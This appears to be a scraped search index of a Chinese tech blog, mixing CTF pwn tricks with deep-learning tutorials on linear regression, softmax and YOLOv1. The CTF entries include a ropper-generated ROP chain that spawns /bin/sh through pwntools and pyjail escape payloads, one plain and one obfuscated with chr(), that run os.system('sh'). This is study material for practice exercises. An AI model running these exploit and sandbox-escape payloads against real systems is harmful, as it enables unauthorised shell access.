send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout: int = 0.05, no_show: bool = False): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True, is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... # 需要自行设定offset offset: int = 0xC + 4 # Generated by ropper ropchain generator # # 487729c3b55aaec43deb2af4c896b16f9dbd01f7e484054d1bb7f24209e2d3ae IMAGE_BASE_0 = 0x08048000 def rebase_0(x): return pg(x + IMAGE_BASE_0) rop = b\u0026#39;\u0026#39; rop += rebase_0(0x00070016) # 0x080b8016: pop eax; ret; rop += b\u0026#39;/bin\u0026#39; rop += rebase_0(0x00026cda) # 0x0806ecda: pop edx; ret; rop += rebase_0(0x000a2060) rop += rebase_0(0x0000c66b) # 0x0805466b: mov dword ptr [edx], eax; ret; rop += rebase_0(0x00070016) # 0x080b8016: pop eax; ret; rop += b\u0026#39;/sh\\x00\u0026#39; rop += rebase_0(0x00026cda) # 0x0806ecda: pop edx; ret; rop += rebase_0(0x000a2064) rop += rebase_0(0x0000c66b) # 0x0805466b: mov dword ptr [edx], eax; ret; rop += rebase_0(0x00070016) # 0x080b8016: pop eax; ret; rop += pg(0x00000000) rop += rebase_0(0x00026cda) # 0x0806ecda: pop edx; ret; rop += rebase_0(0x000a2068) rop += rebase_0(0x0000c66b) # 0x0805466b: mov dword ptr [edx], eax; ret; rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; rop += rebase_0(0x000a2060) rop += rebase_0(0x00096769) # 0x080de769: pop ecx; ret; rop += rebase_0(0x000a2068) rop += rebase_0(0x00026cda) # 0x0806ecda: pop edx; ret; rop += rebase_0(0x000a2068) rop += rebase_0(0x00070016) # 0x080b8016: pop eax; ret; rop += pg(0x0000000b) rop += rebase_0(0x00027430) # 0x0806f430: int 0x80; ret; payload = flat({offset: rop}) sendline_after_clean(payload) interactive_after_clean() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/tricks/%E4%BD%BF%E7%94%A8ropgadgetropper%E5%B7%A5%E5%85%B7%E6%9E%84%E5%BB%BAropchain/","section":"tricks","summary":"The extreme limit of wisdom, that\u0026rsquo;s what the public calls madness. — Jean Cocteau 查看程序架构 ida伪代码 exp 这题手工构造ropchain比较困难，但是我们可以利用ropper或者ROPgadget的rop","tags":["pwn","ROPgadget","ropper","ropchain"],"title":"使用ROPgadget、ropper工具构建ropchain"},{"categories":null,"contents":"","date":"2022年12月29日","permalink":"https://peterliuzhi.top/stats/stats/","section":"stats","summary":"","tags":null,"title":"统计"},{"categories":["tricks"],"contents":" Kindness is the golden chain by which society is bound together. — Johann Wolfgang von Goethe\n如何查看当前系统libc版本 如何查看当前系统libc版本 查看当前系统的libc版本 查看程序当前默认使用的libc版本 查看当前系统的libc版本 strings /lib/x86_64-linux-gnu/libc.so.6 | grep \u0026#34;GNU C Library\u0026#34; 自动化脚本 使用命令行参数指定libc\n#!/bin/bash if [ -z \u0026#34;$*\u0026#34; ]; then strings /lib/x86_64-linux-gnu/libc.so.6 | grep \u0026#34;GNU C Library\u0026#34; else strings $@ | grep \u0026#34;GNU C Library\u0026#34; fi 查看程序当前默认使用的libc版本 ldd -v \u0026lt;程序名\u0026gt; ","date":"2022年12月28日","permalink":"https://peterliuzhi.top/tricks/%E5%A6%82%E4%BD%95%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9Flibc%E7%89%88%E6%9C%AC/","section":"tricks","summary":"Kindness is the golden chain by which society is bound together. — Johann Wolfgang von Goethe 如何查看当前系统libc版本 如何查看当前系统libc版本 查看当前系统的libc版本 查看程序当前默认使用的libc版本 查","tags":["pwn","libc"],"title":"如何查看当前系统libc版本"},{"categories":["tricks"],"contents":" Never give up, for that is just the place and time that the tide will turn. — Harriet Beecher Stowe\n先输入空格就好了，atoi会跳过空格\n","date":"2022年12月27日","permalink":"https://peterliuzhi.top/tricks/%E7%BB%95%E8%BF%87atoi%E5%89%8D%E5%AF%B9%E9%A6%96%E5%AD%97%E7%AC%A6%E6%98%AF%E5%90%A6%E4%B8%BA%E8%B4%9F%E5%8F%B7%E7%9A%84%E6%A3%80%E6%9F%A5/","section":"tricks","summary":"Never give up, for that is just the place and time that the tide will turn. — Harriet Beecher Stowe 先输入空格就好了，atoi会跳过空格","tags":["pwn","atoi"],"title":"绕过atoi前对首字符是否为负号的检查"},{"categories":["tricks"],"contents":" Happiness cannot be travelled to, owned, earned, worn or consumed. Happiness is the spiritual experience of living every minute with love, grace and gratitude. — Denis Waitley\n基础版 __import__(\u0026#39;os\u0026#39;).system(\u0026#39;sh\u0026#39;) 进阶版 getattr(getattr(getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104)) 如果知道flag文件的名字，可以用:\nopen(chr(102)+chr(108)+chr(97)+chr(103)).read() 更多资料参见https://zhuanlan.zhihu.com/p/578986988\n","date":"2022年12月23日","permalink":"https://peterliuzhi.top/tricks/%E7%BB%95%E8%BF%87pyjail%E4%B8%80%E5%8F%A5%E8%AF%9Drce/","section":"tricks","summary":"Happiness cannot be travelled to, owned, earned, worn or consumed. Happiness is the spiritual experience of living every minute with love, grace and gratitude. — Denis Waitley 基础版 __import__(\u0026#39;os\u0026#39;).system(\u0026#39;sh\u0026#39;) 进阶版 getattr(getattr(getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104)) 如果知道flag文件的名字，可以用: open(chr(102)+chr(108)+chr(97)+chr(103)).read() 更多资料参见https://zhuanla","tags":["web","pyjail"],"title":"绕过pyjail——一句话RCE"},{"categories":["principle","Introduction"],"contents":" Every great dream begins with a dreamer. Always remember, you have within you the strength, the patience, and the passion to reach for the stars to change the world. — Harriet Tubman\nDeepLearning 基本框架 梯度:下山最快的方向 Loss函数 梯度到底是啥? 基本框架 整个神经网络就是一个函数\n每一个点都是一个神经元，每一个神经元的每一次传导都有自己的权重(weight)和偏置(bias)，最后乘上激活函数(activation function)来模拟生物神经元的激活 梯度:下山最快的方向 Question:应该如何调整weight和bias才能最快减少网络判断结果和真实结果之间的差距？\n先引入几个概念\nLoss函数 对最后判定的值\r而言，它与真实值y有一定差距 为表达误差,我们定义Loss函数:\r,亦称为平方损失(square loss) 整个Loss函数为: 而使该Loss函数最小的参数记为: 梯度到底是啥? definition:梯度的本意是一个向量（矢量），表示某一函数在该点处的方向导数沿着该方向取得最大值，即函数在该点处沿着该方向（此梯度的方向）变化最快，变化率最大（为该梯度的模）。\n梯度下降法（英语：Gradient descent）是一个一阶最优化算法，通常也称为最陡下降法，但是不该与近似积分的最陡下降法（英语：Method of steepest descent）混淆。 要使用梯度下降法找到一个函数的局部极小值，必须向函数上当前点对应梯度（或者是近似梯度）的反方向的规定步长距离点进行迭代搜索。如果相反地向梯度正方向迭代进行搜索，则会接近函数的局部极大值点；这个过程则被称为梯度上升法。\n因此每一次梯度下降就好像下山(降低Loss),等到达山谷的最低处(Loss的最低处)就达到了训练的目的\n","date":"2022年11月16日","permalink":"https://peterliuzhi.top/principle/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/introduction/deeplearning%E4%BB%8B%E7%BB%8D/","section":"principle","summary":"Every great dream begins with a dreamer. Always remember, you have within you the strength, the patience, and the passion to reach for the stars to change the world. — Harriet Tubman DeepLearning 基本框架 梯度:下山最快的方向 Loss函数 梯度到底是啥? 基本框架 整个神经网络就是一个函","tags":["deeplearning","intro"],"title":"DeepLearning介绍"},{"categories":["principle","SimpleImplement"],"contents":" The attempt to combine wisdom and power has only rarely been successful and then only for a short while. — Albert Einstein\n线性回归的简单实现 定义函数 定义模型函数(X*W+b) 定义 Loss 函数1/2(y_hat - y)^2，计算网络所得结果和真实结果中间的差距 定义优化函数，调整 weight 和 bias 定义数据选取函数，随机选取小批次数据（随机梯度下降法） 定义生成 weight 和 bias 的随机函数 定义训练函数 执行训练 定义函数 定义模型函数(X*W+b) 注意，因为这是线性回归模型，不需要引入非线性，自然也不用引入激活函数\n# 定义模型（函数）,此处的模型是最基本的矩阵乘法 def linMul(x,w,b): return torch.mm(x,w) + b 定义 Loss 函数1/2(y_hat - y)^2，计算网络所得结果和真实结果中间的差距 # 定义Loss函数 def Loss(y_hat, y): # 1/2*(y_hat - y)^2 return (y_hat - y.view(y_hat.size()))**2/2 定义优化函数，调整 weight 和 bias # 定义优化算法 def sgd(params, lr, batch_size): # params是weight和bias的列表 for param in params: param.data -= lr*param.grad / batch_size 定义数据选取函数，随机选取小批次数据（随机梯度下降法） # 定义数据及其迭代器 # 把数据分批次 def data_iter(features: torch.tensor, batch_size:int, labels:torch.tensor): total_size = len(features) # print(f\u0026#34;total size:{total_size}\u0026#34;) indexes = list(range(0,total_size)) random.shuffle(indexes) for i in range(0, total_size, batch_size): choice = torch.tensor(indexes[i:min(i+batch_size, total_size)]) yield features.index_select(0,choice), labels.index_select(0,choice) 定义生成 weight 和 bias 的随机函数 maker = lambda x,y,z: torch.tensor([[round(ele.item(),10) for ele in np.random.normal(0,x,y)]],dtype=torch.float32, requires_grad=z) 定义训练函数 # 定义训练函数 def train(num_epoches, lr, features, batch_size, labels, hat_w, hat_b, true_w, true_b): for epoch in range(num_epoches): for x,y in data_iter(features, batch_size, labels): lab_tmp = linMul(x, hat_w.T, hat_b) # print(lab_tmp) l = Loss(lab_tmp, y).sum() l.backward() sgd([hat_w, hat_b], lr, batch_size) hat_w.grad.data.zero_() hat_b.grad.data.zero_() train_l = Loss(linMul(features, hat_w.T, hat_b), labels).sum() print(f\u0026#34;epoch {epoch}, loss:{train_l}\u0026#34;) print(f\u0026#34;true weight:{true_w}, hat weight:{hat_w}\u0026#34;) print(f\u0026#34;true bias:{true_b}, hat bias:{hat_b}\u0026#34;) 执行训练 def main(): # 先定义真正的w\u0026amp;b，还有应该得到的结果 true_w = maker(10,2,False) true_b = maker(5,1,False) print(f\u0026#34;true weight:{true_w}, true bias:{true_b}\u0026#34;) #定义1000个数据(特征值) features = torch.randn((1000, 2)) print(f\u0026#34;features:{features}\u0026#34;) # 定义真值 labels = linMul(features, true_w.T, true_b) # 初始化参数 hat_w = maker(0.01,2,True) hat_b = maker(0.01,1,True) # 定义学习率和迭代次数 lr = 0.03 num_epoches = 10 train(num_epoches, lr, features, 10, labels, hat_w, hat_b, true_w, true_b) ","date":"2022年11月16日","permalink":"https://peterliuzhi.top/principle/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/simpleimplement/linearregression/","section":"principle","summary":"The attempt to combine wisdom and power has only rarely been successful and then only for a short while. — Albert Einstein 线性回归的简单实现 定义函数 定义模型函数(X*W+b) 定义 Loss 函数1/2(y_hat - y)^2，计算网络所得结","tags":["deeplearning","线性回归","completion"],"title":"LinearRegression"},{"categories":["principle","softmax"],"contents":" Imagination is more important than knowledge. For while knowledge defines all we currently know and understand, imagination points to all we might yet discover and create. — Albert Einstein\nsoftmax 回归概述 softmax 回归是什么 Softmax 公式 Softmax 回归的 Loss 函数——交叉熵损失函数 softmax 回归是什么 有时候我们的输出值不是一个值，而是一串离散的值（比如识别手写数字），这时候我们不能简单地线性地表示结果（线性的结果可以任意大，难以判断此时应该是哪一个离散的值，线性值与离散值之间的误差也难以衡量），这时候我们就需要将结果表示为概率，将所有值压缩在$(0,1]$间\n这时候就需要所谓的逻辑函数(sigmod 函数)，不同的是，softmax 在输出结果等于 2 时退化回逻辑回归\n原博客地址\nsoftmax 函数和之前的线性函数一样，是全连接层的，也就是说，它的每一个结点都与上一层的所有结点相连\nSoftmax 公式 对所有结果取指数相加作为整体，再用单个节点的指数除以这个整体就是该节点的概率\n$$ \\hat{y_{1}},\\hat{y_{2}},\\hat{y_{3}} = softmax(o_{1},o_{2},o_{2}), $$\n$$ \\hat{y_{j}} = \\frac{exp(o_{j})}{\\sum_{i=1}^{3}exp(o_{i})} (j = 1,2,3) $$\n因此模型公式为：\n$$ \\hat{Y} = softmax(XW+b) $$\nSoftmax 回归的 Loss 函数——交叉熵损失函数 因为平方差损失函数总是要求模拟结果和预期结果完全拟合，对 Softmax 回归这种多个输出计算概率的回归过于严格，因此应该采用一种只要某一节点的概率远高于其他节点就判定拟合的 Loss 函数，因此我们采用交叉熵损失函数： 对第 i 组数据：\n$$ H(y^{(i)}, \\hat{y}^{(i)}) = -\\sum_{j=1}^{q} y_{j}^{(i)}\\log {\\hat{y}_{j}^{(i)}},其中j为模拟的第j个节点 $$\n因此 Loss 函数是：\n$$ l(\\Theta) = \\frac{1}{n} \\sum_{i=1}^{n} H(y^{(i)}, \\hat{y}^{(i)}) = \\frac{1}{n} \\sum_{i=1}^{n} y_{j}^{(i)}\\log {\\hat{y}_{j}^{(i)}},其中n为当前批次的数据个数 $$\n又因为每个结果的真实值（概率）不是 0 就是 1，且只有一个节点真实值为 1，所以所谓的\n$$ -\\sum_{j=1}^{q} y_{j}^{(i)}\\log {\\hat{y}_{j}^{(i)}} $$\n其实只有一项，为\n$$ -y_{k}^{(i)} \\log {\\hat{y}_{k}^{(i)}}=-\\log {\\hat{y}_{k}^{(i)}} $$\n其中 k 为概率为 1 的节点 k\n因此交叉熵损失函数就是真节点（概率为 1 的节点）的模拟值的对数之和的均值的负数\n同时我们也可以看到，Loss 函数等价于：\n$$ exp(nl(\\Theta)) = \\prod_{i=1}^{n} \\hat{y}_{k}^{(i)} $$\n因此最小化交叉熵损失函数等价于最大化训练数据集所有标签类别的联合预测概率\n感谢奔跑的小仙女的博客\n","date":"2022年11月16日","permalink":"https://peterliuzhi.top/principle/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/softmax/softmax-intro/","section":"principle","summary":"Imagination is more important than knowledge. For while knowledge defines all we currently know and understand, imagination points to all we might yet discover and create. — Albert Einstein softmax 回归概述 softmax 回归是什么 Softmax 公式 Softmax 回归的 Loss 函数——交叉熵损失函数 softmax 回归是什么 有时候我们的输出值不","tags":["deeplearning","softmax"],"title":"softmax intro"},{"categories":["principle","softmax"],"contents":" True friendship is like sound health; the value of it is seldom known until it is lost. — Charles Caleb Colton\nsoftmax 简单实现 需要导入的库 定义需要的函数 定义模型函数 定义交叉熵损失函数 定义准确率 定义优化算法 定义数据分批的函数 训练函数 测试训练成果 开始训练 训练结果 需要导入的库 import torch import torchvision import numpy as np import torchvision.transforms as transforms 定义需要的函数 一次统计学习由学习的模型，学习的策略，学习的算法组成\n定义模型函数 定义 softmax 函数，将非线性引入线性回归之中\n# 定义softmax def softmax(Oi: torch.Tensor): Oi_exp = Oi.exp() return Oi_exp/(Oi_exp.sum(dim=1, keepdim=True)) # 定义模型 def net(X: torch.Tensor, W: torch.Tensor, b: torch.Tensor): return softmax(torch.mm(X.view((-1, W.size()[0])), W)+b) 定义交叉熵损失函数 形式上是对数损失函数\n依靠经验误差对模型进行选择\n# 定义Loss函数 # 交叉熵损失函数 # 表现为对数损失函数 def Loss(y: torch.Tensor, y_hat: torch.Tensor): # 这里的y是n*1的矩阵，而y_hat是n*j return - torch.log(y_hat.gather(1, y.view(-1, 1))).sum() 定义准确率 def accuracy(y: torch.Tensor, y_hat: torch.Tensor): # 如果某一次模型预测结果与真实结果相同，就返回1，否则返回0 # 用argmax函数获取y_hat中最大项的索引（0~9），与真实结果对比 # 转化为float后加和，取其中的值返回 return (y_hat.argmax(1) == y).float().sum().item() 定义优化算法 和前面一样的\n# 定义优化算法 def sgd(params, lr, batch_size): for param in params: # 学习率就是一个用于控制下降幅度的常数 # 权重和偏移优化 param.data -= lr*param.grad / batch_size 定义数据分批的函数 def data_iter(mnist_test, batch_size): return torch.utils.data.DataLoader(mnist_test, batch_size=batch_size, shuffle=True, num_workers=0) 训练函数 只要获取到了训练好的权重和偏移，就相当于获得了训练好的模型\ndef train(n_epoches: int, lr: float, w_hat: torch.Tensor, b_hat: torch.Tensor, batch: int, data: torch.Tensor) -\u0026gt; torch.Tensor: n_features = len(data) # 一共拟合训练数据n_epoch次 for epoch in range(n_epoches): # 初始化某一次的经验误差，准确率 train_l, ac = 0.0, 0.0 # 随机梯度下降法，将数据分批 for f, lb in data_iter(data, batch): y_hat = net(f, w_hat, b_hat) # 计算当前批次经验损失并与上一批的损失加和 l = Loss(lb, y_hat).sum() train_l += l # 计算准确率 ac += accuracy(lb, y_hat) # 反向求偏导 l.backward() # 反向优化模型 sgd([w_hat, b_hat], lr, batch) w_hat.grad.data.zero_() b_hat.grad.data.zero_() # 将误差总和，准确率总和除以训练样本容量 train_l /= n_features ac /= n_features print(f\u0026#34;epoch {epoch}, loss:{train_l}, accuracy:{ac}\u0026#34;) print(f\u0026#34;hat weight:{w_hat}\u0026#34;) print(f\u0026#34;hat bias:{b_hat}\u0026#34;) return w_hat, b_hat 测试训练成果 def test(test_iter: torch.Tensor, w: torch.Tensor, b: torch.Tensor): ac = 0.0 batch_size = len(test_iter) for f, lb in data_iter(test_iter, batch_size): y_hypo = net(f, w, b) ac += accuracy(lb, y_hypo) ac /= batch_size print(f\u0026#34;test accuracy:{ac}\u0026#34;) 开始训练 def main(): batch_size = 256 # 得到的是训练组和测试组 # 用训练组来训练模型，用测试组来测试模型准确度 train_iter = torchvision.datasets.FashionMNIST(root=\u0026#39;~/Datasets/FashionMNIST\u0026#39;, train=True, download=False, transform=transforms.ToTensor()) test_iter = torchvision.datasets.FashionMNIST(root=\u0026#39;~/Datasets/FashionMNIST\u0026#39;, train=False, download=False, transform=transforms.ToTensor()) # 行数*列数，是一张图的像素总量 num_inputs = 28*28 # 标注问题，只有0~9一共10个标注 num_outputs = 10 # 初始化权重与偏移 w = torch.tensor(np.random.normal( 0, 0.01, (num_inputs, num_outputs)), dtype=torch.float, requires_grad=True) b = torch.zeros(num_outputs, dtype=torch.float, requires_grad=True) # 训练模型 w, b = train(10, 0.03, w, b, batch_size, train_iter) # 测试模型 test(test_iter, w, b) if __name__ == \u0026#34;__main__\u0026#34;: main() 训练结果 epoch 0, loss:1.0356025695800781, accuracy:0.69585 epoch 1, loss:0.709172248840332, accuracy:0.7767 epoch 2, loss:0.6368897557258606, accuracy:0.7977333333333333 epoch 3, loss:0.597575306892395, accuracy:0.80825 epoch 4, loss:0.5720041394233704, accuracy:0.8157666666666666 epoch 5, loss:0.5530234575271606, accuracy:0.8211666666666667 epoch 6, loss:0.5385252833366394, accuracy:0.8246333333333333 epoch 7, loss:0.5267878770828247, accuracy:0.8280666666666666 epoch 8, loss:0.5172721743583679, accuracy:0.8301 epoch 9, loss:0.5093177556991577, accuracy:0.8327666666666667 hat weight:tensor([[ 3.6310e-03, -7.5329e-03, 3.7053e-03, ..., 3.1249e-02, -2.1517e-03, 2.2466e-03], [ 2.1203e-02, -8.7482e-03, 1.5493e-02, ..., -2.7951e-03, -6.2426e-03, 2.5957e-02], [ 1.7465e-02, 1.5385e-03, -2.2081e-03, ..., 1.4364e-02, 2.8634e-03, -2.0297e-02], ..., [ 9.7792e-05, 3.9122e-03, 2.1818e-02, ..., -1.7938e-02, 2.0017e-02, -7.0280e-03], [-2.0205e-04, -1.5446e-02, 3.1180e-03, ..., -1.0438e-02, -2.1133e-03, -6.5218e-03], [-3.9553e-03, 4.7967e-03, -1.0672e-02, ..., -4.2892e-03, -4.3317e-04, -1.1061e-02]], requires_grad=True) hat bias:tensor([ 0.0898, -0.0810, -0.0846, 0.0271, -0.4667, 1.0832, 0.2318, -0.0801, -0.2585, -0.4609], requires_grad=True) test accuracy:0.8204 ","date":"2022年11月16日","permalink":"https://peterliuzhi.top/principle/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/softmax/softmax%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/","section":"principle","summary":"True friendship is like sound health; the value of it is seldom known until it is lost. — Charles Caleb Colton softmax 简单实现 需要导入的库 定义需要的函数 定义模型函数 定义交叉熵损失函数 定义准确率 定义优化算法 定义数据分批的函数 训","tags":["deeplearning","softmax","completion"],"title":"softmax简单实现"},{"categories":["principle"],"contents":" Coming together is a beginning; keeping together is progress; working together is success. — Edward Everett Hale\nYOLOv1 介绍 检测原理 神经网络设计 训练 激活函数 loss 函数 过拟合处理 介绍 You Only Look Once:Unified, Real-Time Object Detectio\nyolo 是统一、单阶段的，快速、即时的目标检测模型\n相较于其他的模型（例如 CNN）\n它的最大特点是快 同时是“全局性”（globally）检测，更有整体观 能够提取出物体的抽象特征，便于迁移到艺术品等的检测 检测原理 yolo 将整个图片分成 S*S 个格子（grid），然后对其分别做两个检测\n物体框（bounding box），包括五个维度：x,y(中心点坐标),w,h(宽和长),C(置信度) 其中的置信度指的是这个框内存在物体的概率的可信度，用存在物体的概率乘以 IOU（预测事实与真正事实的交集除以预测事实与真正事实的并集） 类别检测（conditional class），每一个小方块预测一个类别，表示这个小方块内的物体框如果有物体那这个物体的类别是什么 因此，某方块内存在某类别的物体的置信度是： yolo 输入张量的维度为 S*S*(B*5+c)，在 yolov1 中 B 往往是 1\n所以，yolo 的基本思想是：在这个区域有物体，而且这个物体是这个类别的，所以在这个区域有这个类别的物体\n神经网络设计 yolov1 的主体是卷积神经网络，模型大小取决于卷积神经网络的层次\n对原图多次卷积、池化（最大池化）后接两个全连接层\n通过卷积提取出原图的多个局部特征，通过池化降噪，然后经过全连接层整合特征并引入非线性后得到结果\n训练 激活函数 采用 leakyReLU 函数 loss 函数 过拟合处理 ","date":"2022年11月16日","permalink":"https://peterliuzhi.top/principle/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/yolo/yolov1/","section":"principle","summary":"Coming together is a beginning; keeping together is progress; working together is success. — Edward Everett Hale YOLOv1 介绍 检测原理 神经网络设计 训练 激活函数 loss 函数 过拟合处理 介绍 You Only Look Once:Unified, Real-Time Object Detectio yolo 是统一、单阶段的，快速、即时的目标检测模型","tags":["pwn"],"title":"yolov1"},{"categories":["principle","softmax"],"contents":" It always seems impossible until it\u0026rsquo;s done. — Nelson Mandela\n使用 torchvision 库\n图像识别 从 MNIST 获取数据 定义画图函数 将数据集里的 labels 映射为字符串 打印 features 和 labels import matplotlib.pyplot as plt import numpy as np import torchvision import torchvision.transforms as transforms 从 MNIST 获取数据 # 获得的是Mnist中标注过的数据 trained_set = torchvision.datasets.FashionMNIST(root=\u0026#39;~/Datasets/FashionMNIST\u0026#39;, train=True, download=False, transform=transforms.ToTensor()) 定义画图函数 # 定义画图函数 def draw(features, labels): # 设置图表大小 plt.rcParams[\u0026#39;figure.figsize\u0026#39;] = (8.0, 6.0) # 创建子图 _, axs = plt.subplots(10, len(features) // 10) # 调整间距 plt.subplots_adjust(left=None, bottom=None, right=None, top=None, wspace=None, hspace=2) assert isinstance(axs, np.ndarray) # 类型断言 # 将多维数组转化为一维数组 axs = axs.reshape((1, -1))[0] # print(axs) # 对每一个子图单独设置它们的像素值和标签 for ax, img, lbl in zip(axs, features, labels): # 像素值放置 ax.imshow((img.view((28, 28))).numpy()) # 设置标签 ax.set_title(lbl) # 取消显示轴 ax.axes.get_xaxis().set_visible(False) ax.axes.get_yaxis().set_visible(False) plt.show() 将数据集里的 labels 映射为字符串 # 设置每一个数字的映射值 def get_fashion_mnist_labels(labels): text_labels = [\u0026#39;t-shirt\u0026#39;, \u0026#39;trouser\u0026#39;, \u0026#39;pullover\u0026#39;, \u0026#39;dress\u0026#39;, \u0026#39;coat\u0026#39;, \u0026#39;sandal\u0026#39;, \u0026#39;shirt\u0026#39;, \u0026#39;sneaker\u0026#39;, \u0026#39;bag\u0026#39;, \u0026#39;ankle boot\u0026#39;] return [text_labels[int(i)] for i in labels] 打印 features 和 labels # 把训练好的数据连同每一张图对应的识别值打印出来 draw([trained_set[i][0] for i in range(30)], get_fashion_mnist_labels([trained_set[i][1] for i in range(30)])) ","date":"2022年11月16日","permalink":"https://peterliuzhi.top/principle/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/softmax/%E5%9B%BE%E5%83%8F%E8%AF%86%E5%88%ABintro/","section":"principle","summary":"It always seems impossible until it\u0026rsquo;s done. — Nelson Mandela 使用 torchvision 库 图像识别 从 MNIST 获取数据 定义画图函数 将数据集里的 labels 映射为字符串 打印 features 和 labels import matplotlib.pyplot as plt import numpy as np import torchvision import torchvision.transforms as transforms 从 MNIST 获取数据 # 获得的是Mn","tags":["deeplearning","图像识别","intro"],"title":"图像识别intro"},{"categories":["principle","SimpleImplement"],"contents":" You\u0026rsquo;re not obligated to win. You\u0026rsquo;re obligated to keep trying to do the best you can every day. — Marian Wright Edelman\n我们之前的程序有时兼顾了太多的细节，pytorch的库里有许多优雅而方便的方法，我们可以利用它们来优化我们的程序\n线性回归优化实现-利用pytorch 重构函数 定义数据（features和labels） 定义Loss函数 定义模型 定义优化函数 定义训练函数 开始训练 重构函数 定义数据（features和labels） def data_iter(features: torch.tensor, batch_size:int, labels:torch.tensor): # 原本的实现 # total_size = len(features) # indexes = list(range(0,total_size)) # random.shuffle(indexes) # for i in range(0, total_size, batch_size): # choice = torch.tensor(indexes[i:min(i+batch_size, total_size)]) # yield features.index_select(0,choice), labels.index_select(0,choice) # 